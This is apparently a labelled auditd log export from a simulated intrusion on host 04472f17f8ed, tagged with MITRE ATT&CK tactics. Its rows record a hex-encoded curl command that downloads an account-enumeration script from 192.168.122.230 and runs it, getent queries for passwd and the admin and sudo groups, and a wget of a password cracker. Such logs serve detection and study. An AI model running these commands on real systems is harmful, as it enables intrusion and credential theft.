@timestamp,a0,a1,a10,a2,a3,a4,a5,a6,a7,a8,a9,command_executed,event.original,host.name,message,sequence,tactic,technique
"Sep 27, 2024 @ 15:07:28.519",sh,-c,-,-,-,-,-,-,-,-,-,sh -c,"type=EXECVE msg=audit(1727449647.966:341299): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320276375726C202D6F202F746D702F656E756D65726174652D6163636F756E74732E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F617074332D74313038372E3030312E73683B2063686D6F64202B78202F746D702F656E756D65726174652D6163636F756E74732E73683B202F746D702F656E756D65726174652D6163636F756E74732E736827",04472f17f8ed,"type=EXECVE msg=audit(1727449647.966:341299): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320276375726C202D6F202F746D702F656E756D65726174652D6163636F756E74732E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F617074332D74313038372E3030312E73683B2063686D6F64202B78202F746D702F656E756D65726174652D6163636F756E74732E73683B202F746D702F656E756D65726174652D6163636F756E74732E736827",341299,-,-
"Sep 27, 2024 @ 15:07:28.519",/bin/bash,-c,-,-,-,-,-,-,-,-,-,/bin/bash -c,"type=EXECVE msg=audit(1727449647.966:341300): argc=3 a0=""/bin/bash"" a1=""-c"" a2=6375726C202D6F202F746D702F656E756D65726174652D6163636F756E74732E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F617074332D74313038372E3030312E73683B2063686D6F64202B78202F746D702F656E756D65726174652D6163636F756E74732E73683B202F746D702F656E756D65726174652D6163636F756E74732E7368",04472f17f8ed,"type=EXECVE msg=audit(1727449647.966:341300): argc=3 a0=""/bin/bash"" a1=""-c"" a2=6375726C202D6F202F746D702F656E756D65726174652D6163636F756E74732E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F617074332D74313038372E3030312E73683B2063686D6F64202B78202F746D702F656E756D65726174652D6163636F756E74732E73683B202F746D702F656E756D65726174652D6163636F756E74732E7368",341300,-,-
"Sep 27, 2024 @ 15:07:28.519",chmod,#NAME?,-,/tmp/enumerate-accounts.sh,-,-,-,-,-,-,-,chmod +x /tmp/enumerate-accounts.sh,"type=EXECVE msg=audit(1727449648.006:341303): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/enumerate-accounts.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449648.006:341303): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/enumerate-accounts.sh""",341303,discovery,Account Discovery: Local Account
"Sep 27, 2024 @ 15:07:28.520",/bin/bash,/tmp/enumerate-accounts.sh,-,-,-,-,-,-,-,-,-,/bin/bash /tmp/enumerate-accounts.sh,"type=EXECVE msg=audit(1727449648.010:341305): argc=2 a0=""/bin/bash"" a1=""/tmp/enumerate-accounts.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449648.010:341305): argc=2 a0=""/bin/bash"" a1=""/tmp/enumerate-accounts.sh""",341305,discovery,Account Discovery: Local Account
"Sep 27, 2024 @ 15:07:28.520",getent,passwd,-,-,-,-,-,-,-,-,-,getent passwd,"type=EXECVE msg=audit(1727449648.034:341307): argc=2 a0=""getent"" a1=""passwd""",04472f17f8ed,"type=EXECVE msg=audit(1727449648.034:341307): argc=2 a0=""getent"" a1=""passwd""",341307,discovery,Account Discovery: Domain Account
"Sep 27, 2024 @ 15:07:28.520",getent,group,-,admin,-,-,-,-,-,-,-,getent group admin,"type=EXECVE msg=audit(1727449648.114:341309): argc=3 a0=""getent"" a1=""group"" a2=""admin""",04472f17f8ed,"type=EXECVE msg=audit(1727449648.114:341309): argc=3 a0=""getent"" a1=""group"" a2=""admin""",341309,-,-
"Sep 27, 2024 @ 15:07:28.520",getent,group,-,sudo,-,-,-,-,-,-,-,getent group sudo,"type=EXECVE msg=audit(1727449648.122:341311): argc=3 a0=""getent"" a1=""group"" a2=""sudo""",04472f17f8ed,"type=EXECVE msg=audit(1727449648.122:341311): argc=3 a0=""getent"" a1=""group"" a2=""sudo""",341311,-,-
"Sep 27, 2024 @ 15:07:28.520",awk,-F:,-,-,-,-,-,-,-,-,-,awk -F:,"type=EXECVE msg=audit(1727449648.026:341306): argc=3 a0=""awk"" a1=""-F:"" a2=7B207072696E74202431207D",04472f17f8ed,"type=EXECVE msg=audit(1727449648.026:341306): argc=3 a0=""awk"" a1=""-F:"" a2=7B207072696E74202431207D",341306,-,-
"Sep 27, 2024 @ 15:07:28.520",awk,-F:,-,-,-,-,-,-,-,-,-,awk -F:,"type=EXECVE msg=audit(1727449648.114:341308): argc=3 a0=""awk"" a1=""-F:"" a2=7B7072696E742024347D",04472f17f8ed,"type=EXECVE msg=audit(1727449648.114:341308): argc=3 a0=""awk"" a1=""-F:"" a2=7B7072696E742024347D",341308,-,-
"Sep 27, 2024 @ 15:07:28.520",awk,-F:,-,-,-,-,-,-,-,-,-,awk -F:,"type=EXECVE msg=audit(1727449648.122:341310): argc=3 a0=""awk"" a1=""-F:"" a2=7B7072696E742024347D",04472f17f8ed,"type=EXECVE msg=audit(1727449648.122:341310): argc=3 a0=""awk"" a1=""-F:"" a2=7B7072696E742024347D",341310,-,-
"Sep 27, 2024 @ 15:08:13.525",wget,http://192.168.122.230:8080/john,-,#NAME?,/tmp/john,-,-,-,-,-,-,wget http://192.168.122.230:8080/john -O /tmp/john,"type=EXECVE msg=audit(1727449685.994:341314): argc=4 a0=""wget"" a1=""http://192.168.122.230:8080/john"" a2=""-O"" a3=""/tmp/john""",04472f17f8ed,"type=EXECVE msg=audit(1727449685.994:341314): argc=4 a0=""wget"" a1=""http://192.168.122.230:8080/john"" a2=""-O"" a3=""/tmp/john""",341314,credential-access,Brute Force: Password Cracking
